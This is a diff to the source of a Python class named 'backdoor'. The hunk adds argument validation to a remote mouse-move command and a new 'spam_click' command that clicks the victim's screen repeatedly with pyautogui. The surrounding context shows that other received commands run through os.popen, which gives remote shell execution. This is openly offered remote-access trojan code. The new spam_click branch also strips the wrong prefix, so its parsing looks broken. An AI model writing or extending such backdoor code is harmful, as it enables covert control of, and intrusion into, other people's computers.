@@ -154,9 +154,25 @@ class backdoor:
                         mouse_command_args = mouse_command_args.replace(")", "")
                         mouse_command_args = mouse_command_args.split(",")
                         mouse_command_args = list(map(int,mouse_command_args))
-                        pyautogui.moveTo(mouse_command_args[0], mouse_command_args[1])
-                        continue
-                    
+                        if len(mouse_command_args) == 2:
+                            pyautogui.moveTo(mouse_command_args[0], mouse_command_args[1])
+                            continue
+                        else:
+                            output += "Invalid amount of arguments. Two arguments needed. X,Y\n"
+                    elif mouse_command.startswith("spam_click"):
+                        mouse_command_args = mouse_command.replace("move", "")
+                        mouse_command_args = mouse_command_args.replace("(", "")
+                        mouse_command_args = mouse_command_args.replace(")", "")
+                        mouse_command_args = mouse_command_args.split(",")
+                        mouse_command_args = list(map(int,mouse_command_args))
+                        if len(mouse_command_args) == 3:
+                            for i in range(mouse_command_args[2]):
+                                pyautogui.click(mouse_command_args[0], mouse_command_args[1])
+                            continue
+                        else:
+                            output += "Invalid amounts of arguments. Only 3 arguments needed, [x,y,amount_of_times_to_click]\n"
+                    else:
+                        output += "Invalid command [click(),right_click(), move(), spam_click()\n"
             else:
                 output += os.popen(command).read() + "\n"
                 
